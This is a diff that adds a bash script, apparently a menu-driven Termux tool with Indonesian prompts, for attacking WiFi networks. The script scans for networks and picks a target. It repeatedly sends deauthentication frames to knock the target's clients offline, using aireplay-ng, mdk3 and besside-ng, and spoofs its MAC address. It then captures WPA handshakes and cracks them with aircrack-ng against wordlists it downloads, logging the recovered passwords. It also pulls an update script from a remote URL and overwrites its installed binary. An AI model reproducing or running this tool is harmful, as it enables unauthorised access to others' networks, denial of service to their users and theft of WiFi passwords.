@@ -1,0 +1,647 @@
+#!/bin/bash
+echo "-------------------"
+waktu=`date '+'%Y-%m-%d_%H-%M-%S''`
+hari=`date '+'%Y-%m-%d''`
+FILENAME=dump
+CRACK="$HOME"
+DIR=$CRACK/dump
+HASH=$CRACK/dump/hs
+TMP=$CRACK/dump/tmp
+BESSIDE=$CRACK/dump/besside
+#KEY=$HASH/wifipass-$waktu.txt
+KEY=$HASH/wifipass.txt
+PASS=$HASH/wifipassfound.txt
+WORDLIST=`cat $DIR/wordlist.txt`
+ESSID=`cat $DIR/essid.txt`
+BSSID=`cat $DIR/bssid.txt`
+WBSSID=`cat $DIR/wbssid.txt`
+CLIENT=`cat $DIR/client.txt`
+CH=`cat $DIR/ch.txt`
+WLAN=`cat $DIR/wlan.txt`
+IFACE=`cat $DIR/ifmon.txt`
+#IFACE=mon0
+URLUPDATE="https://raw.githubusercontent.com/s1sw4nto/lagu/main/$FILENAME"
+clear
+echo "ESSID:" $ESSID
+echo "BSSID:" $BSSID
+echo "CHANNEL:" $CH 
+echo "CLIENT:" $CLIENT
+echo "-------------------"
+echo "Current Target: $ESSID BSSID: $BSSID"
+echo "-------------------"
+echo "Select Menu:"
+echo "-------------------"
+
+crack(){
+             cd $HASH
+             echo "----------------------------------------"
+             echo "Enter Cap filename"
+             echo "----------------------------------------"
+             cap=$(find -type f | grep -Ei '(mp3|cap)$' | awk -F "./" '{print $2}')
+             echo "$cap"
+             echo "----------------------------------------"
+             echo "Enter Number"
+             echo "----------------------------------------"
+             read N
+             name=$(find -type f | grep -Ei '(mp3|cap)$' | awk -F "./" '{print $2}' | sed -n "$N"p)
+             echo "----------------------------------------"
+             echo "Cap Name: $name"
+             echo "$name" > $DIR/capname.txt
+             bssid=$(aircrack-ng $HASH/"$name" | awk -F " " 'NR==6{print $2}')
+             essid=$(aircrack-ng $HASH/"$name" | awk -F " " 'NR==6{print $3}')
+             hand=$(aircrack-ng $HASH/"$name" | awk -F "(" 'NR==6{print $2}'  | awk -F ")" '{print $1 $2}')
+             echo "----------------------------------------"
+             echo "ESSID: $essid"
+             echo "$essid" > $DIR/essid.txt
+             echo "----------------------------------------"
+             echo "BSSID: $bssid"
+             echo "$bssid" > $DIR/bssid.txt
+             echo "----------------------------------------"
+             echo "Handshake: $hand"
+             ESSID=`cat $DIR/essid.txt`
+             BSSID=`cat $DIR/bssid.txt`
+             NAME=`cat $DIR/capname.txt`
+             rm -rf $KEY
+             echo "----------------------------------------"
+             echo "Crack Handshake:"
+             echo "----------------------------------------"
+             echo "ESSID: $ESSID"
+             echo "----------------------------------------"
+             echo "BSSID: $BSSID"
+             echo "----------------------------------------"
+             echo "CAP NAME: $NAME"
+             echo "----------------------------------------"
+             read -p "Worlist Custom ? y/n: " yn
+             echo "-----------------"
+             case $yn in
+                [Yy]* )
+				    echo "$DIR/wordlist-top4800-probable.txt" > $DIR/wordlist.txt
+                ;;
+                [Nn]* ) echo "$DIR/1900_2030.txt" > $DIR/wordlist.txt
+                ;;
+                * ) echo "Please answer yes or no.";;
+             esac
+			 WORDLIST=`cat $DIR/wordlist.txt`
+             echo "WORDLIST: $WORDLIST"
+             echo "----------------------------------------"
+             aircrack-ng -a 2 -w $WORDLIST -b "$BSSID" $HASH/"$NAME" -l $KEY
+             if [ -f "$KEY" ]; then
+                   echo "----------------------------------------"
+                   echo "KEY FOUND: $KEY"
+                   echo "----------------------------------------"
+                   PWD=`cat $KEY`
+                   echo ESSID: $ESSID - $BSSID - $PWD >> $PASS
+                   echo "Current pass:"
+                   echo "----------------------------------------"
+                   echo "ESSID: $ESSID"
+                   echo "BSSID: $BSSID"
+                   echo "PASWD: $PWD"
+                   echo "----------------------------------------"
+                   echo "All pass: $PASS"
+                   echo "----------------------------------------"
+                   cat $PASS
+                   echo "----------------------------------------"
+                   killall aircrack-ng > /dev/null 2>&1 &
+                   killall $FILENAME
+	               exit
+             else
+                   echo "KEY NOT FOUND"
+                   exit
+             fi
+}
+monitor(){
+            killall airodump-ng 
+            rm -rf $TMP/*.cap
+            rm -rf $TMP/*.csv
+            echo "-------------------"
+            echo "Monitor Target: $ESSID"
+            echo "-------------------"
+            echo "ESSID: $ESSID"
+            echo "BSSID: $BSSID"
+            echo "CHANNEL: $CH"
+            echo "-------------------"
+            airodump-ng $IFACE --berlin 10 -f 500 -a --channel $CH --bssid $BSSID -w $TMP/wpa --output-format pcap,csv --ignore-negative-one > /dev/null 2>&1 &
+            
+}
+deauth(){
+             clear
+             #cat $TMP/wpa-01.csv | awk '/BSSID/{y=1;next}y' | awk -F',' '/ /{print $14}' > $DIR/essid.txt
+             #sleep 1
+             ESSID=`cat $DIR/essid.txt`
+             BSSID=`cat $DIR/bssid.txt`
+             CH=`cat $DIR/ch.txt`
+             rm -rf $KEY
+             echo "-------------------"
+             echo "Deauth Target: $ESSID"
+             echo "-------------------"
+             echo "ESSID: $ESSID"
+             echo "BSSID: $BSSID"
+             echo "CHANNEL: $CH"
+             echo "-------------------"
+             #echo $ESSID - $BSSID - $CLIENT - $CH >> $CRACK/dump/target/Target-$hari.txt
+             #rm -rf $TMP/*.cap
+             #rm -rf $TMP/*.csv
+             #airodump-ng $IFACE --berlin 10 -f 500 -a --channel $CH --bssid $BSSID -w $TMP/wpa --output-format pcap,csv --ignore-negative-one  > /dev/null 2>&1 &
+             while true
+             do
+                  for (( i=15; i>0; i--)); do
+                        sleep 1
+                        #aircrack-ng -a 2 -w $WORDLIST -b $BSSID $TMP/wpa-01.cap -l $KEY
+                        hand=$(aircrack-ng $TMP/wpa-01.cap | awk -F "(" 'NR==6{print $2}'  | awk -F " " '{print $1}')
+                        echo "Count: $i - handshake: $hand"
+                        if [[ $hand > 0  ]]; then
+                            essid=$(aircrack-ng $TMP/wpa-01.cap | awk -F " " 'NR==6{print $3}')
+                            cp $TMP/wpa-01.cap $HASH/$essid.cap
+                            echo "-------------------"
+                            echo "Handshake FOUND : $hand handshake"
+                            echo "Disimpan di: $HASH/$essid.cap"
+                            echo "-------------------"
+                            killall airodump-ng > /dev/null 2>&1 &
+                            killall aircrack-ng > /dev/null 2>&1 &
+                            killall aireplay-ng > /dev/null 2>&1 &
+                            killall mdk3 > /dev/null 2>&1 &
+                            killall besside-ng > /dev/null 2>&1 &
+                            killall $FILENAME
+	                        exit
+                        else
+                            wait
+                        fi
+                  done
+             clear
+             echo "-------------------"
+             cat $TMP/wpa-01.csv | awk '/BSSID/{y=1;next}y' | awk -F',' '/ /NR == 1{print $14}' | awk -F " " '{print$1}' > $DIR/essid.txt
+             cat $TMP/wpa-01.csv | awk '/Station/{y=1;next}y' | awk -F',' '/ /{print $1}' > $DIR/client.txt
+             sleep 1
+             filename=$DIR/client.txt
+             #IFS=$'\n'
+             for next in `cat $filename`; do
+                       #echo "$next read from $filename" 
+                       aireplay-ng -0 1 $IFACE -a $BSSID -c $next --ignore-negative-one -D 
+                       sleep 1
+             done
+             monitor &
+             #exit 0
+             #CLIENT=`cat $DIR/client.txt`
+             #aireplay-ng -0 1 $IFACE -a $BSSID -c $CLIENT --ignore-negative-one -D 
+             #sleep 2
+             done
+}
+PS3='Choose: '
+foods=("First Start Only" "Monitor Network" "Select Target" "Monitor Target" "Deauth Target" "Deauth MDK3 Blacklist" "Crack" "Crack Cap" "Airde-Cap" "Get Client" "Exit" "Deauth MDK3 Whitelist" "Deauth BESSIDE")
+select fav in "${foods[@]}"; do
+    case $fav in
+        "First Start Only")
+            if [ -d "$DIR" ]; then
+                echo "-------------------"
+                echo "Dump folder: $DIR"
+                echo "Wordlist: $WORDLIST"
+            else
+                 echo "-------------------"
+                 echo "Created dump folder: $DIR"
+                 mkdir $DIR
+				 mkdir $TMP
+				 mkdir $HASH
+				 mkdir $BESSIDE
+            fi
+            echo "-------------------"
+            echo "airmon-ng start" $WLAN
+            echo "Replace Mac adress" $WLAN
+            echo "-------------------"
+			echo "Pastikan wifi mati, jika tidak HP akan hank"
+			echo "Ketik y jika sudah mati, dan n jika belum"
+			echo "-----------------"
+			read -p "Pilih: " yn
+            case $yn in
+                     [Yy]* ) echo "Wifi sudah mati"
+                                  airmon-ng start $WLAN > /dev/null 2>&1 &
+                                  sleep 4
+                                  ifconfig $IFACE down
+                                  macchanger -r $IFACE
+                                  ifconfig $IFACE up
+                                  #macchanger -s mon0
+                                  echo "-----------------"
+                     ;;
+                     [Nn]* ) echo "Exit Matikan Wifi"
+                                  echo "-----------------"
+								  exit
+                     ;;
+                     [Dd]* ) echo "Clear settings"
+					              cd $TMP
+                                  rm -rf *.*
+                                  cd $BESSIDE
+								  rm -rf *.*
+								  exit
+                     ;;
+                     * ) echo "Please answer Ya or Ok";;
+            esac
+        ;;
+        "Monitor Network")
+            echo "-------------------"
+            echo "Monitor All Network"
+            echo "-------------------"
+            rm -rf $TMP/wpacsv*
+            airodump-ng $IFACE --berlin 10 -f 500 -a -w $TMP/wpacsv --output-format pcap,csv  --ignore-negative-one
+            echo "-------------------"
+            echo "Select BSSID Number:"
+            echo "-------------------"
+            #cat $TMP/wpacsv-01.csv | awk '/channel/{y=1;next}y' | awk -F',' '/ /{print "(" NR ") " $1 $14 $4}'
+            #cat $TMP/wpacsv-01.csv | awk '/channel/{y=1;next}y' | awk -F',' '/ /{print "(" NR ") " $1 $14 $4}' > $TMP/dump.txt
+             #cat $TMP/dump.txt| egrep "(1)" | awk -F " " '{print $2}'
+
+            list=`cat $TMP/wpacsv-01.csv | awk '/channel/{y=1;next}y' | awk -F',' '/ /{print NR " " $1 $14 $4}'`
+            echo "$list"
+            echo "-------------------"
+            echo "Enter Number:"
+            read N
+            bssid=$(echo "$list" | awk -F " " '{print $2}' | sed -n "$N"p)
+            echo "-------------------"
+            echo "$bssid"
+            #read bssid
+            echo $bssid > $DIR/bssid.txt
+            echo "-------------------"
+            #echo "Enter CHANNEL =>"
+            #read chan
+            #echo $chan > $DIR/ch.txt
+            BSSID=`cat $DIR/bssid.txt`
+            cat $TMP/wpacsv-01.csv | egrep "$BSSID" | awk -F "," 'NR == 1{print $14}' | awk -F " " '{print$1}' > $DIR/essid.txt
+            ESSID=`cat $DIR/essid.txt`
+            cat $TMP/wpacsv-01.csv | egrep "$BSSID" | awk -F "," 'NR == 1{print $4}' | awk -F " " '{print$1}' > $DIR/ch.txt
+            CH=`cat $DIR/ch.txt`
+            clear
+            echo "-------------------"
+            echo "Select Target: $ESSID"
+            echo "-------------------"
+            echo "ESSID: $ESSID"
+            echo "BSSID: $BSSID"
+            echo "CHANNEL: $CH"
+            echo "-------------------"
+            rm -rf $TMP/*.cap
+            rm -rf $TMP/*.csv
+            sleep 1
+            airodump-ng $IFACE --berlin 10 -f 500 -a --channel $CH --bssid $BSSID -w $TMP/wpa --output-format pcap,csv --ignore-negative-one > /dev/null 2>&1 &
+            sleep 1
+            killall airodump-ng
+            deauth
+        ;;
+		"Select Target")
+		    echo "-------------------"
+            echo "Select BSSID Number:"
+            echo "-------------------"
+		    list=`cat $TMP/wpacsv-01.csv | awk '/channel/{y=1;next}y' | awk -F',' '/ /{print NR " " $1 $14 $4}'`
+            echo "$list"
+            echo "-------------------"
+            echo "Enter Number:"
+            read N
+            bssid=$(echo "$list" | awk -F " " '{print $2}' | sed -n "$N"p)
+            echo "-------------------"
+            echo "$bssid"
+            #read bssid
+            echo $bssid > $DIR/bssid.txt
+            echo "-------------------"
+            #echo "Enter CHANNEL =>"
+            #read chan
+            #echo $chan > $DIR/ch.txt
+            BSSID=`cat $DIR/bssid.txt`
+            cat $TMP/wpacsv-01.csv | egrep "$BSSID" | awk -F "," 'NR == 1{print $14}' | awk -F " " '{print$1}' > $DIR/essid.txt
+            ESSID=`cat $DIR/essid.txt`
+            cat $TMP/wpacsv-01.csv | egrep "$BSSID" | awk -F "," 'NR == 1{print $4}' | awk -F " " '{print$1}' > $DIR/ch.txt
+            CH=`cat $DIR/ch.txt`
+            clear
+            echo "-------------------"
+            echo "Select Target: $ESSID"
+            echo "-------------------"
+            echo "ESSID: $ESSID"
+            echo "BSSID: $BSSID"
+            echo "CHANNEL: $CH"
+            echo "-------------------"
+            #rm -rf $TMP/*.cap
+            #rm -rf $TMP/*.csv
+            sleep 1
+            airodump-ng $IFACE --berlin 10 -f 500 -a --channel $CH --bssid $BSSID -w $TMP/wpa --output-format pcap,csv --ignore-negative-one > /dev/null 2>&1 &
+            sleep 1
+            killall airodump-ng
+            deauth
+		;;
+        "Monitor Target")
+            BSSID=`cat $DIR/bssid.txt`
+            ESSID=`cat $DIR/essid.txt`
+            CH=`cat $DIR/ch.txt`
+            echo " " > $DIR/client.txt
+            rm -rf $TMP/*.cap
+            rm -rf $TMP/*.csv
+            echo "-------------------"
+            echo "Monitor Target: $ESSID"
+            echo "-------------------"
+            echo "ESSID: $ESSID"
+            echo "BSSID: $BSSID"
+            echo "CHANNEL: $CH"
+            echo "-------------------"
+            airodump-ng $IFACE --berlin 10 -f 500 -a --channel $CH --bssid $BSSID -w $TMP/wpa --output-format pcap,csv --ignore-negative-one
+            #cat $TMP/wpa-01.csv | awk '/BSSID/{y=1;next}y' | awk -F',' '/ /{print $14}' > $DIR/essid.txt
+        ;;
+        "Deauth Target")
+             deauth
+        ;;
+	"Deauth MDK3 Blacklist")
+	        ESSID=`cat $DIR/essid.txt`
+            BSSID=`cat $DIR/bssid.txt`
+	        CH=`cat $DIR/ch.txt`
+	        echo "-------------------"
+	        echo "Deauth Target Blacklist: $ESSID"
+	        echo "-------------------"
+	        echo "ESSID: $ESSID"
+            echo "BSSID: $BSSID"
+            echo "CHANNEL: $CH"
+	        echo "-------------------"
+            #mdk3 $IFACE p -t $BSSID -с $CH -b a
+            mdk3 $IFACE d -b $DIR/bssid.txt -c $CH
+            exit
+        ;;
+        "Crack")
+             BSSID=`cat $DIR/bssid.txt`
+             rm -rf $KEY
+	         echo "-------------------"
+             echo "Crack Handshake: $ESSID"
+             echo "-------------------"
+             echo "ESSID: $ESSID"
+             echo "BSSID: $BSSID"
+             echo "-------------------"
+             read -p "Worlist Custom ? y/n: " yn
+             echo "-----------------"
+             case $yn in
+                [Yy]* )
+				    echo "$DIR/wordlist-top4800-probable.txt" > $DIR/wordlist.txt
+                ;;
+                [Nn]* ) echo "$DIR/1900_2030.txt" > $DIR/wordlist.txt
+                ;;
+                * ) echo "Please answer yes or no.";;
+             esac
+			 WORDLIST=`cat $DIR/wordlist.txt`
+             echo "WORDLIST: $WORDLIST"
+             echo "----------------------------------------"
+             cat $TMP/wpa-01.csv | awk '/Station/{y=1;next}y' | awk -F',' '/ /{print $1}' > $DIR/client.txt
+             CLIENT=`cat $DIR/client.txt`
+             aircrack-ng -a 2 -w $WORDLIST -b $BSSID $TMP/wpa-01.cap -l $KEY
+             if [ -f "$KEY" ]; then
+                   echo "-------------------"
+                   echo "KEY FOUND: $KEY"
+                   echo "-------------------"
+                   PWD=`cat $KEY`
+                   echo ESSID: $ESSID - $BSSID - $PWD >> $PASS
+                   echo "Current pass:"
+                   echo "-------------------"
+                   echo "ESSID: $ESSID"
+                   echo "BSSID: $BSSID"
+                   echo "PASWD: $PWD"
+                   echo "-------------------"
+                   echo "All pass: $PASS"
+                   echo "-------------------"
+                   cat $PASS
+                   echo "-------------------"
+                   killall airodump-ng > /dev/null 2>&1 &
+                   killall aircrack-ng > /dev/null 2>&1 &
+                   killall aireplay-ng > /dev/null 2>&1 &
+                   killall mdk3 > /dev/null 2>&1 &
+                   killall besside-ng > /dev/null 2>&1 &
+                   killall $FILENAME
+	               exit
+             else
+                   echo "KEY NOT FOUND"
+                   exit
+             fi
+        ;;
+        "Crack Cap")
+            crack
+        ;;
+        "Airde-Cap")
+            echo "-------------------"
+            echo "ESSID: $ESSID"
+            echo "BSSID: $BSSID"
+            echo "-------------------"
+            airdecap-ng -b $BSSID $TMP/wpa-01.cap
+            exit
+        ;;
+        "Get Client")
+            echo "-------------------"
+            aircrack-ng -c $TMP/wpa-01.cap -J $TMP/Hashcat
+            rm -rf $TMP/Hashcat.hccap
+            exit
+        ;;
+        "Exit")
+                echo "-------------------"
+	            echo "Exit"
+	            killall mdk3 > /dev/null 2>&1 &
+                killall airodump-ng > /dev/null 2>&1 &
+                killall aircrack-ng > /dev/null 2>&1 &
+                killall aireplay-ng > /dev/null 2>&1 &
+                killall besside-ng > /dev/null 2>&1 &
+                killall $FILENAME
+	            exit
+	    ;;
+        "Deauth MDK3 Whitelist")
+             WBSSID=`cat $DIR/wbssid.txt`
+	         echo "-------------------"
+	         echo "Deauth All AP Ignore Whitelist"
+	         echo "-------------------"
+	         echo "$WBSSID"
+	         echo "-------------------"
+             CH=`cat $DIR/ch.txt`
+             #mdk3 $IFACE p -t $BSSID -с $CH -b a
+             #mdk3 $IFACE d -b $DIR/bssid.txt -s 100 -c $CH
+             mdk3 $IFACE d -w $DIR/wbssid.txt
+             exit
+        ;;
+        "Deauth BESSIDE")
+		      cd $BESSIDE
+	          echo "-------------------"
+	          echo "Deauth besside: $BSSID CH $CH"
+	          echo "-------------------"
+             #besside-ng $WLAN -b $BSSID -с $CH -p 10 -v
+             besside-ng $IFACE -b $BSSID -c $CH -v
+        ;;
+        *) echo "invalid option $REPLY";;
+    esac
+	
+update(){
+   clear
+   ping -c 4 -s 560 1.1.1.1
+   if [ "$?" != "0" ];then
+		  echo "-------------------"
+          echo "Ping failed"
+          echo "Cannot Update"
+          echo "-------------------"
+   else
+          clear
+          wget $URLUPDATE -O $PREFIX/bin/$FILENAME
+          clear
+          wget https://github.com/s1sw4nto/lagu/raw/main/wordlist-top4800-probable.txt -O $DIR/wordlist-top4800-probable.txt
+          clear
+		  wget https://github.com/s1sw4nto/lagu/raw/main/1900_2030.txt -O $DIR/1900_2030.txt
+          clear
+          cd $PREFIX/etc/apt
+          ls
+          echo "-------------------"
+          cat sources.list
+          echo "-------------------"
+          echo "deb https://packages.termux.org/apt/termux-main/ stable main" > $PREFIX/etc/apt/sources.list
+          pkg clean -y
+          pkg autoclean -y
+          pkg update -y
+          clear
+          echo "-------------------"
+          cat sources.list
+          echo "-------------------"
+          echo "Update selesai"
+          echo "-------------------"
+          echo "Ketik: $$FILENAME"
+          echo "-------------------"
+          exit
+    fi
+}
+case $1 in
+"install")
+   clear
+   echo "-----------------"
+   echo "File tersimpan di sdcard/TermuxFiles"
+   sleep 3
+   echo "-----------------"
+   echo "Ijinkan penyimpanan file di filemanager"
+   echo "Tekan ijinkan atau allow atau y"
+   echo "-----------------"
+   sleep 6
+   termux-setup-storage
+   sleep 4
+   clear
+   ping -c 4 -s 560 1.1.1.1
+   if [ "$?" != "0" ];then
+		     echo "-------------------"
+             echo "Ping failed"
+             echo "Check Internet kamu"
+   else
+          echo "-------------------"
+          echo "Created dump folder: $DIR"
+          mkdir $DIR
+		  mkdir $TMP
+		  mkdir $HASH
+		  mkdir $BESSIDE
+          clear
+          wget https://github.com/s1sw4nto/lagu/raw/main/wordlist-top4800-probable.txt -O $DIR/wordlist-top4800-probable.txt
+          clear
+		  wget https://github.com/s1sw4nto/lagu/raw/main/1900_2030.txt -O $DIR/1900_2030.txt
+          clear
+          echo "deb https://packages.termux.org/apt/termux-main/ stable main" > $PREFIX/etc/apt/sources.list
+          clear
+          echo "-------------------"
+          echo "Install paket, ini butuh waktu lama.."
+          echo "-------------------"
+          sleep 4
+          clear
+          pkg install root-repo -y
+          clear
+          pkg install x11-repo -y
+          clear
+          pkg clean -y
+          pkg autoclean - y
+          pkg update -y
+          clear
+          mkdir $HOME/storage/shared/TermuxFiles
+          clear
+          pkg install apt nano -y
+          clear
+          pkg install aircrack-ng -y
+          clear
+		  pkg install macchanger -y
+		  clear
+          #pkg install python -y
+          #clear
+          pkg install aria2 -y
+          clear
+          #pkg install proot -y
+          #pkg install tsudo -y
+          pkg install tsu -y
+          clear
+          cp $FILENAME $PREFIX/bin/$FILENAME
+          chmod a+rx $PREFIX/bin/$FILENAME
+          rm $FILENAME
+          rm wget-log
+          rm wget-log.*
+          pkg clean -y
+          pkg autoclean - y
+          clear
+          pkg update -y
+          clear
+          cd $PREFIX/etc/apt
+          ls
+          echo "-------------------"
+          cat sources.list
+          echo "-------------------"
+          cat sources.list.dpkg-old
+          echo "-------------------"
+          cd $PREFIX/etc/apt/sources.list.d
+          ls
+          echo "-------------------"
+		  cd ..
+		  ls
+		  sleep 4
+		  echo "-------------------"
+          echo "Setting Konfigurasi:"
+		  echo "-------------------"
+		  echo essid > $DIR/essid.txt
+          echo bssid > $DIR/bssid.txt
+          echo wbssid > $DIR/wbssid.txt
+          echo 1 > $DIR/ch.txt
+          echo client > $DIR/client.txt
+          echo "-------------------"
+          #ifconfig | grep "Link" | awk '{print$1}'
+          #iwconfig | grep "IEEE" | awk '{print$1}'
+		  airmon-ng
+          echo "-------------------"
+          echo "Enter WLAN Interface =>"
+          echo "Example: wlan0 or wlan1 look interface above"
+          read wlan
+          echo $wlan > $DIR/wlan.txt
+          WLAN=`cat $DIR/wlan.txt`
+		  sleep 3
+		  echo "-------------------"
+            echo "airmon-ng start" $WLAN
+			echo "Pastikan wifi mati, jika tidak HP akan hank"
+			echo "Ketik y jika sudah mati, dan n jika belum"
+			echo "-----------------"
+			read -p "Pilih: " yn
+            case $yn in
+                     [Yy]* ) echo "Wifi sudah mati"
+                                  airmon-ng start $WLAN
+		                          echo "-------------------"
+                                  echo "Enter IFMON Interface =>"
+                                  echo "Example: wlanmon0 look interface above"
+                                  read ifmon
+                                  echo $ifmon > $DIR/ifmon.txt
+		                          IFACE=`cat $DIR/ifmon.txt`
+                                  #echo "-------------------"
+                                  #echo "Enter Wordlist location =>"
+                                  #echo "Example: $DIR/wordlist-top4800-probable.txt"
+                                  #echo "Example: /usr/share/dict/wordlist-top4800-probable.txt"
+                                  #read wordlist
+                                  #echo $wordlist > $DIR/wordlist.txt
+		                          echo "$DIR/wordlist-top4800-probable.txt" > $DIR/wordlist.txt
+                                  echo "-----------------"
+                     ;;
+                     [Nn]* ) echo "Exit Matikan Wifi"
+                                  echo "-----------------"
+								  exit
+                     ;;
+                     * ) echo "Please answer Ya or Ok";;
+            esac
+		  
+          echo "Instalasi selesai"
+          echo "-------------------"
+          echo "Ketik: $FILENAME"
+          echo "-------------------"
+          exit
+	 fi
+;;
+*)
+        echo "Command: $FILENAME install"
+;;
+done
+
